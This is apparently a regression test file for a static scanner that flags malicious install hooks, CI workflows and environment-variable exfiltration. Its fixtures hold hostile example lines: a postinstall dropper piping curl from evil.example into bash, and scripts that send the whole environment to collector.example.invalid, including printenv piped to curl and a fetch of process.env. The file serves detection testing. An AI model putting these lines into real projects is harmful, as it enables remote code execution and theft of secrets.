/**
 * v0.1.9 regression tests (validation/problems.md P-069, P-071, P-072,
 * P-091), hunted by the overnight chaos and cross-dogfood swarms on the
 * published 0.1.7 and re-verified on 0.1.8. Two P-091 tests (the xod
 * run_cli shape and its remote control) were added at v0.1.10
 * acceptance time, when the real CloudCorpRecords/xod clone exposed
 * two residual shapes of the same problem that the distilled fixture
 * did not carry.
 *
 * P-069: a FIFO (named pipe) planted in the scanned tree hung the scan
 * forever: surface files were opened with no stat-type check, and
 * opening a FIFO blocks until a writer appears. Non-regular files
 * (FIFO, socket, device) must be skipped by stat type before any open,
 * in every discovery and read path.
 * P-071: an early-closing reader (piped to head -c 100) on a very
 * large report still received the verdict exit code, reporting silent
 * truncation as success. The CLI never adopted the factory flush-aware
 * emit contract (FACTORY-NOTES.md): it printed with console.log and
 * had no EPIPE handling at all. An early close must exit 141.
 * P-072: nested discovery stopped at depth 4. The bound is raised to
 * 8 so realistic monorepo nesting is actually scanned; the bound
 * warning and the never-bare-CLEAN rule below it stay.
 * P-091: ENV-EXFIL fired on environment inheritance into a child
 * process (the {**os.environ, ...} spread passed as env= to a
 * subprocess) plus loopback-only network, verdicating
 * CloudCorpRecords/xod COMPROMISED-PATTERN. Inheritance forms passed
 * as a subprocess env= require a non-loopback destination in the
 * flow, and the ENV-BULK evidence must not call the spread idiom a
 * dump.
 * Static scans only: fixture code is never executed.
 */
import { describe, it, after } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { existsSync, mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { classifyCommand, scanHooks } from "../src/core.js";

function fixture(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "hookcheck-v019-"));
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel);
    mkdirSync(join(abs, ".."), { recursive: true });
    writeFileSync(abs, content);
  }
  return dir;
}
const dirs: string[] = [];
function fx(files: Record<string, string>): string { const d = fixture(files); dirs.push(d); return d; }
after(() => { for (const d of dirs) rmSync(d, { recursive: true, force: true }); });

function fifo(dir: string, rel: string): void {
  const abs = join(dir, rel);
  mkdirSync(join(abs, ".."), { recursive: true });
  execFileSync("mkfifo", [abs]);
}

const BENIGN_PKG = JSON.stringify({ name: "benign", scripts: { test: "echo ok" } });
const BENIGN_WF = "name: ci\non: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo benign\n";
const DROPPER_PKG = JSON.stringify({ name: "x", scripts: { postinstall: "curl -s https://evil.example/x | bash" } });

function chain(depth: number): Record<string, string> {
  const parts: string[] = [];
  for (let i = 0; i < depth; i++) parts.push(`d${i}`);
  return { [`${parts.join("/")}/package.json`]: DROPPER_PKG };
}

describe("P-072: nested discovery reaches realistic monorepo depth (bound raised to 8)", () => {
  it("the depth 5 package.json dropper (corpus chaos-deep5 shape) is found and verdicts COMPROMISED-PATTERN", () => {
    const dir = fx(chain(5));
    const r = scanHooks(dir);
    assert.equal(r.verdict, "COMPROMISED-PATTERN", `verdict ${r.verdict}, warnings ${r.warnings.join(" | ")}`);
    assert.ok(r.findings.some((f) => f.file === "d0/d1/d2/d3/d4/package.json" && f.classification === "RISKY"), `findings ${JSON.stringify(r.findings.map((f) => f.file))}`);
  });

  it("a depth 8 chain is also found", () => {
    const dir = fx(chain(8));
    const r = scanHooks(dir);
    assert.equal(r.verdict, "COMPROMISED-PATTERN", `verdict ${r.verdict}`);
    assert.ok(r.findings.some((f) => f.file.endsWith("d7/package.json")), `findings ${JSON.stringify(r.findings.map((f) => f.file))}`);
  });

  it("beyond the new bound: the depth 9 package is out, the warning names depth 8, and the verdict is not a bare CLEAN", () => {
    const dir = fx(chain(9));
    const r = scanHooks(dir);
    assert.equal(r.counts.total, 0, "the depth 9 package stays outside the bound");
    assert.ok(r.warnings.some((w) => /depth 8/i.test(w) && /bound/i.test(w)), `warnings: ${r.warnings.join(" | ")}`);
    assert.notEqual(r.verdict, "CLEAN", "the probe saw the package.json below the bound, so no bare CLEAN");
  });
});

const CD1_SCRIPT = [
  "import os, subprocess, sys, urllib.request",
  'ENV = {**os.environ, "XOD_PYTHON": sys.executable, "HOME": "C:/tmp/home"}',
  'srv = subprocess.Popen([sys.executable, "-m", "uvicorn", "app.main:app", "--host", "127.0.0.1", "--port", "8123"], env=ENV)',
  'urllib.request.urlopen("http://127.0.0.1:8123/", timeout=2)',
  'out = subprocess.run(["xod", "status", "--json"], capture_output=True, text=True, env=ENV, timeout=120)',
  "print(out.stdout)",
  "",
].join("\n");
const CD1_WF = [
  "name: win",
  "on: [push]",
  "jobs:",
  "  test:",
  "    runs-on: windows-latest",
  "    steps:",
  "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
  "      - name: terminal test",
  "        run: python tests/run_terminal_test.py",
  "",
].join("\n");

describe("P-091: environment inheritance into a subprocess plus loopback-only network is not ENV-EXFIL", () => {
  it("the distilled cd1 fixture verdicts at most REVIEW with no ENV-EXFIL finding", () => {
    const dir = fx({
      ".github/workflows/win.yml": CD1_WF,
      "tests/run_terminal_test.py": CD1_SCRIPT,
    });
    const r = scanHooks(dir);
    assert.notEqual(r.verdict, "COMPROMISED-PATTERN", `verdict ${r.verdict}`);
    assert.ok(r.findings.every((f) => !f.rules.includes("ENV-EXFIL")), `findings ${JSON.stringify(r.findings.map((f) => [f.file, f.rules]))}`);
  });

  it("the spread script classified directly carries no ENV-EXFIL (python)", () => {
    const r = classifyCommand(CD1_SCRIPT, "python");
    assert.ok(!r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("dict(os.environ) passed as env= with loopback only does not fire ENV-EXFIL", () => {
    const script = [
      "import os, subprocess, sys, urllib.request",
      "E2 = dict(os.environ)",
      'urllib.request.urlopen("http://127.0.0.1:9000/health", timeout=2)',
      'out = subprocess.run(["tool", "status"], capture_output=True, text=True, env=E2)',
      "print(out.stdout)",
      "",
    ].join("\n");
    const r = classifyCommand(script, "python");
    assert.ok(!r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("os.environ.copy() passed as env= with loopback only does not fire ENV-EXFIL", () => {
    const script = [
      "import os, subprocess, sys, urllib.request",
      "E3 = os.environ.copy()",
      'urllib.request.urlopen("http://localhost:9000/health", timeout=2)',
      'out = subprocess.run(["tool", "status"], capture_output=True, text=True, env=E3)',
      "print(out.stdout)",
      "",
    ].join("\n");
    const r = classifyCommand(script, "python");
    assert.ok(!r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("the ENV-BULK evidence for the spread idiom does not call it a dump and names the inheritance or copy form", () => {
    const r = classifyCommand(CD1_SCRIPT, "python");
    assert.ok(r.rules.includes("ENV-BULK"), `rules: ${r.rules.join(",")}`);
    const bulkEvidence = r.evidence.split("; ").find((e) => e.startsWith("ENV-BULK:")) ?? "";
    assert.ok(bulkEvidence.length > 0, `evidence: ${r.evidence}`);
    assert.ok(!/dump/i.test(bulkEvidence), `ENV-BULK evidence calls the spread a dump: ${bulkEvidence}`);
    assert.ok(/inherit|spread|copy/i.test(bulkEvidence), `ENV-BULK evidence does not name the form: ${bulkEvidence}`);
  });

  it("xod run_cli shape: spread env used through an env=env or ENV fallback wrapper, with a remote URL only inside stand-in test data, does not fire ENV-EXFIL", () => {
    // Distilled from the real tests/smoke/run_cli_test.py in
    // CloudCorpRecords/xod (found at acceptance time on the published
    // candidate): the inherited env dict reaches the subprocess
    // through a wrapper parameter fallback (env=env or ENV), a
    // second generation dict spreads it again and is passed as env=,
    // and the only remote URL in the file is a canned payload string
    // inside a stand-in server card (data, not a destination of any
    // send in the script). Every actual network call is loopback.
    const script = [
      "import os, subprocess, sys, urllib.request",
      'CARDS = {"risky": {"args": {"command": "curl https://evil.example/x.sh | sh"}, "why": "stand-in safety card"}}',
      'ENV = {**os.environ, "PYTHONPATH": "/repo"}',
      "def run_cli(*args, env=None):",
      "    r = subprocess.run([sys.executable, '-m', 'app.cli', *args], env=env or ENV, capture_output=True, text=True)",
      "    return r.stdout",
      'REAL = {**ENV, "XOD_PORT": "8123"}',
      'urllib.request.urlopen("http://127.0.0.1:8123/", timeout=2)',
      'out = run_cli("status", env=REAL)',
      "print(out)",
      "",
    ].join("\n");
    const r = classifyCommand(script, "python");
    assert.ok(!r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("control: the run_cli shape with the send itself aimed at a remote URL still fires ENV-EXFIL", () => {
    const script = [
      "import os, subprocess, sys, urllib.request",
      'ENV = {**os.environ, "PYTHONPATH": "/repo"}',
      "def run_cli(*args, env=None):",
      "    r = subprocess.run([sys.executable, '-m', 'app.cli', *args], env=env or ENV, capture_output=True, text=True)",
      "    return r.stdout",
      'REAL = {**ENV, "XOD_PORT": "8123"}',
      'urllib.request.urlopen("https://collector.example.invalid/collect", timeout=2)',
      'out = run_cli("status", env=REAL)',
      "print(out)",
      "",
    ].join("\n");
    const r = classifyCommand(script, "python");
    assert.ok(r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("control: the same inheritance shape with a remote destination still fires ENV-EXFIL", () => {
    const script = CD1_SCRIPT.replace("http://127.0.0.1:8123/", "https://collector.example.invalid/hook");
    const r = classifyCommand(script, "python");
    assert.ok(r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("control: the A1 shape (whole env serialized into a remote fetch body) still fires ENV-EXFIL", () => {
    const js = 'const payload = JSON.stringify({ env: process.env }); await fetch("https://collector.example.invalid/exfil", { method: "POST", body: payload });';
    const r = classifyCommand(js, "js");
    assert.ok(r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("control: dict(os.environ) serialized into a remote request body still fires ENV-EXFIL", () => {
    const script = 'import os, requests\nrequests.post("https://collector.example.invalid/x", data=dict(os.environ))\n';
    const r = classifyCommand(script, "python");
    assert.ok(r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });

  it("control: printenv piped to a remote curl still fires ENV-EXFIL", () => {
    const r = classifyCommand("printenv | curl -s -d @- https://collector.example.invalid/x");
    assert.ok(r.rules.includes("ENV-EXFIL"), `rules: ${r.rules.join(",")}`);
  });
});

describe("P-071: an early-closing reader never receives the verdict code (flush-aware emit)", () => {
  function bigCleanTree(steps: number): string {
    const lines = ["name: big", "on: push", "jobs:", "  t:", "    runs-on: ubuntu-latest", "    steps:"];
    for (let i = 0; i < steps; i++) lines.push(`      - run: echo step-${i}-with-a-fair-amount-of-padding-text-to-grow-the-report`);
    return fx({ ".github/workflows/big.yml": lines.join("\n") + "\n" });
  }

  function runCliEarlyClose(dir: string): Promise<{ code: number | null; signal: string | null }> {
    return new Promise((resolve, reject) => {
      const tsx = join(process.cwd(), "node_modules", ".bin", "tsx");
      const child = spawn(tsx, [join(process.cwd(), "src", "cli.ts"), "scan", dir, "--json"], { stdio: ["ignore", "pipe", "pipe"] });
      let closed = false;
      child.stdout.on("data", () => {
        if (!closed) { closed = true; child.stdout.destroy(); }
      });
      child.on("error", reject);
      child.on("close", (code, signal) => resolve({ code, signal }));
      setTimeout(() => { child.kill("SIGKILL"); reject(new Error("cli timeout")); }, 60000);
    });
  }

  function runCliFull(dir: string): Promise<{ code: number; stdout: string }> {
    return new Promise((resolve, reject) => {
      const tsx = join(process.cwd(), "node_modules", ".bin", "tsx");
      const child = spawn(tsx, [join(process.cwd(), "src", "cli.ts"), "scan", dir, "--json"], { stdio: ["ignore", "pipe", "pipe"] });
      let stdout = "";
      child.stdout.on("data", (d) => { stdout += d; });
      child.on("error", reject);
      child.on("close", (code) => resolve({ code: code ?? -1, stdout }));
      setTimeout(() => { child.kill("SIGKILL"); reject(new Error("cli timeout")); }, 60000);
    });
  }

  it("a multi-megabyte CLEAN report piped to a reader that closes after the first chunk exits 141, never 0", async () => {
    const dir = bigCleanTree(4000);
    const r = await runCliEarlyClose(dir);
    assert.ok(r.code === 141 || r.signal === "SIGPIPE", `early close gave code ${r.code} signal ${r.signal}; the verdict code for this tree is 0`);
  });

  it("pipe parity for a cooperative reader is preserved: the same report parses in full with exit 0", async () => {
    const dir = bigCleanTree(4000);
    const r = await runCliFull(dir);
    assert.ok(r.stdout.length > 1000000, `stdout was only ${r.stdout.length} chars`);
    const report = JSON.parse(r.stdout) as { verdict: string; counts: { total: number } };
    assert.equal(report.verdict, "CLEAN");
    assert.equal(report.counts.total, 4000);
    assert.equal(r.code, 0);
  });
});

describe("P-069: non-regular files are skipped by stat type before any open", () => {
  it("a FIFO at .github/workflows/pipe.yml does not hang the scan and the benign remainder is audited", () => {
    const dir = fx({ "package.json": BENIGN_PKG, ".github/workflows/ci.yml": BENIGN_WF });
    fifo(dir, ".github/workflows/pipe.yml");
    const r = scanHooks(dir);
    assert.equal(r.counts.total, 1, `findings ${JSON.stringify(r.findings.map((f) => f.file))}`);
    assert.equal(r.findings[0].file, ".github/workflows/ci.yml");
    assert.equal(r.verdict, "CLEAN");
  });

  it("a FIFO as the root package.json does not hang the scan", () => {
    const dir = fx({ ".github/workflows/ci.yml": BENIGN_WF });
    fifo(dir, "package.json");
    const r = scanHooks(dir);
    assert.equal(r.counts.total, 1);
    assert.equal(r.findings[0].file, ".github/workflows/ci.yml");
  });

  it("FIFOs at other surface paths (.mcp.json, .vscode/tasks.json, lefthook.yml) do not hang the scan", () => {
    const dir = fx({ "package.json": BENIGN_PKG, ".github/workflows/ci.yml": BENIGN_WF });
    fifo(dir, ".mcp.json");
    fifo(dir, ".vscode/tasks.json");
    fifo(dir, "lefthook.yml");
    const r = scanHooks(dir);
    assert.equal(r.counts.total, 1, `findings ${JSON.stringify(r.findings.map((f) => f.file))}`);
    assert.equal(r.findings[0].file, ".github/workflows/ci.yml");
  });

  it("a FIFO elsewhere in the tree (not a surface name) does not hang the scan", () => {
    const dir = fx({ "package.json": BENIGN_PKG, ".github/workflows/ci.yml": BENIGN_WF, "sub/keep.txt": "x\n" });
    fifo(dir, "sub/random.fifo");
    const r = scanHooks(dir);
    assert.equal(r.counts.total, 1);
    assert.equal(r.verdict, "CLEAN");
  });

  it("a FIFO referenced as a local script target does not hang the one hop follower", () => {
    const dir = fx({
      "package.json": JSON.stringify({ name: "b", scripts: { postinstall: "node setup.mjs" } }),
      ".github/workflows/ci.yml": BENIGN_WF,
    });
    fifo(dir, "setup.mjs");
    const r = scanHooks(dir);
    assert.ok(r.counts.total >= 1, `findings ${JSON.stringify(r.findings.map((f) => f.file))}`);
  });
});
